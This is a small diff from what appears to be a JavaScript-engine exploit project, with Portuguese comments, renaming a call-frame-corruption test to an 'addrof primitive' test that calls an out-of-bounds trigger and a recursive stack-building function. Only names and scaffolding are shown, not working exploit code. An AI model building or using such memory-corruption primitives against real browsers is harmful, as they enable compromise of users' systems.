@@ -1,4 +1,4 @@
-// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: CORRUPÇÃO DE CALLFRAME)
+// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: CONSTRUÇÃO DE ADDROF - CORRIGIDO)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { toHex, AdvancedInt64 } from '../utils.mjs';
 import {
@@ -42,9 +42,9 @@ function build_stack_and_trigger(depth, victim_obj) {
     build_stack_and_trigger(depth - 1, victim_obj);
 }
 
-
-export async function testArbitraryRead() {
-    const FNAME = "testCallFrameCorruption";
+// CORREÇÃO: O nome da função foi alterado para corresponder ao import em runAllAdvancedTestsS3.mjs
+export async function testAddrofPrimitive() {
+    const FNAME = "testAddrofPrimitive"; // Nome da função também atualizado para consistência nos logs
     logS3(`--- Iniciando Tentativa de Leak via Corrupção de CallFrame ---`, "test", FNAME);
 
     await triggerOOB_primitive();
